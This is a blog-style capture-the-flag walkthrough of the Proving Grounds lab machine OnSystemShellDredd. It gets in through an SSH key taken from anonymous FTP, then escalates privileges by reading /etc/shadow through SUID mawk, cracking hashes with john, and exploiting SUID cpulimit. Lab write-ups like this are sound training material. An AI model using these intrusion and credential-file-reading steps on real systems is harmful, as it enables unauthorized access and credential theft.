---
title: "Proving grounds Play: OnSystemShellDredd"
layout: post
date: 2023-07-07 22:10
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---
# Walkthrough on Youtube
[![youtube](/assets/images/CTF/Proving_Grounds/OnSystemShellDredd/youtube.png)](https://youtu.be/UPYHCc7PdGQ)

# NMAP
```bash
naveenj@hackerspace|01:02 AM|~/Pg-Play$ nmap -p- --open -sV -sT -sC 192.168.191.130 -v -oN nmap                                                                                           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 01:02 EDT                                                
PORT      STATE SERVICE VERSION                                                              
21/tcp    open  ftp     vsftpd 3.0.3                                                         
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                       
| ftp-syst:                                                                                  
|   STAT:                                                                                    
| FTP server status:                                                                         
|      Connected to ::ffff:192.168.45.250                                                    
|      Logged in as ftp                                                                      
|      TYPE: ASCII                                                                           
|      No session bandwidth limit                                                            
|      Session timeout in seconds is 300                                                     
|      Control connection is plain text                                                      
|      Data connections will be plain text                                                   
|      At session startup, client count was 4                                                
|      vsFTPd 3.0.3 - secure, fast, stable                                                   
|_End of status                                                                              
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                       
| ssh-hostkey:                                                                               
|   2048 592d210c2faf9d5a7b3ea427aa378908 (RSA)                                              
|   256 5926da443b97d230b19b9b02748b8758 (ECDSA)                                             
|_  256 8ead104fe33e652840cb5bbf1d247f17 (ED25519)                                           
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                               
```

## FTP login
```bash
naveenj@hackerspace|01:07 AM|~$ ftp 192.168.191.130 21                                       
Connected to 192.168.191.130.                                                                
220 (vsFTPd 3.0.3)                                                                           
Name (192.168.191.130:naveenj): anonymous                                                    
331 Please specify the password.                                                             
Password:                                                                                    
230 Login successful.                                                                        
Remote system type is UNIX.                                                                  
Using binary mode to transfer files.                                                         
ftp>
```

### List directory
```sh
ftp> ls -lsa                                                                                 
229 Entering Extended Passive Mode (|||13654|)                                               
150 Here comes the directory listing.                                                        
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .                                    
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..                                   
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah                              
226 Directory send OK.                                                                       
ftp>
```

## Changing directory
```sh
ftp> cd .hannah                                                                              
250 Directory successfully changed.                                                          
ftp> ls -lsa                                                                                 
229 Entering Extended Passive Mode (|||8389|)                                                
150 Here comes the directory listing.                                                        
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .                                    
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..                                   
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa                               
226 Directory send OK.                                                                       
ftp>
```

## Get id_rsa key for user hannah
```sh
ftp> get id_rsa                                                                              
local: id_rsa remote: id_rsa                                                                 
229 Entering Extended Passive Mode (|||17682|)                                               
150 Opening BINARY mode data connection for id_rsa (1823 bytes).                             
100% |************************************************|  1823       11.66 MiB/s    00:00 ETA 
226 Transfer complete.                                                                       
1823 bytes received in 00:00 (8.97 KiB/s)                                                    
ftp>
```

## Login to hannah user using ssh
```sh
naveenj@hackerspace|01:12 AM|~/Pg-Play/OnSystemShellDredd$ ssh -i files/id_rsa hannah@192.168.191.130                                                                                     
ssh: connect to host 192.168.191.130 port 22: Connection refused
```

Apply required permission such as `chmod 600` to the id_rsa file. Still the connection will be refused. As we have one more ssh service running on PORT 61000, we can try to connect there.

```sh
naveenj@hackerspace|01:15 AM|~/Pg-Play/OnSystemShellDredd$ ssh -i files/id_rsa hannah@192.168.191.130 -p 61000                                                                           
                                                                 
hannah@ShellDredd:~$ 
```
Whooo! we are logged in to hannah user now.

### Obtaining Flag
```sh
hannah@ShellDredd:~$ ls
local.txt  user.txt
hannah@ShellDredd:~$ cat user.txt
Your flag is in another file...
hannah@ShellDredd:~$ cat local.txt
5b571██████████████████████████
hannah@ShellDredd:~$ 
```

# Privilege Escalation
Get SUIDs and GUIDs

### SUIDs
```sh
hannah@ShellDredd:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk #--strange binary
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit #--strange binary
/usr/bin/mount
/usr/bin/passwd
```

### GUIDs
```sh
hannah@ShellDredd:~$ find / -perm -g=s -type f 2>/dev/null
/usr/sbin/unix_chkpwd
/usr/bin/wall
/usr/bin/mawk
/usr/bin/ssh-agent
/usr/bin/crontab
/usr/bin/chage
/usr/bin/expiry
/usr/bin/bsd-write
/usr/bin/cpulimit
/usr/bin/dotlockfile
```

Search for the exploit in GFTObins for the strange binary `mawk`

![img](/assets/images/CTF/Proving_Grounds/OnSystemShellDredd/suid_mawk.png)

The exploit worked and we are able to view the shadow file which contains hash of the users passwords.

```sh
hannah@ShellDredd:~$ mawk '//' "/etc/shadow" | grep -iE 'root|hannah'
root:$6$pUGgTFAG7pM5Sy5M$SXmRNf2GSZhId7mGCsFw█████████████████████████████████████████████████████████:18656:0:99999:7:::
hannah:$6$y8GL381zxgwD7gRr$AhERcqNym1qlATj9Rl6R██████████████████████████████████████████████████████.:18656:0:99999:7:::
```

Let's start cracking the hashes using john or crackstation.

Copy both the passwd and shadow files to the local machine to unshadow.

`unshadow passwd shadow > crackme` run the command to unshadow the file.

### Running john
```sh
naveenj@hackerspace|01:56 AM|~/Pg-Play/OnSystemShellDredd/files$ john crackme --wordlist=/usr/share/wordlists/rockyou.txt                                                                 
Using default input encoding: UTF-8                                                          
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])                                                                                       
Cost 1 (iteration count) is 5000 for all loaded hashes                                       
Will run 4 OpenMP threads                                                                    
Press 'q' or Ctrl-C to abort, almost any other key for status
```

After a while there is no progress, so lets check another way.

Let's check the `/usr/bin/cpulimit` binary in GTFObins for exploits.

![img](/assets/images/CTF/Proving_Grounds/OnSystemShellDredd/suid_cpulimit.png)

Running the exploit command.

![img](/assets/images/CTF/Proving_Grounds/OnSystemShellDredd/root.png)

Obtained root and proof flag.

*Happy Hacking!*

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
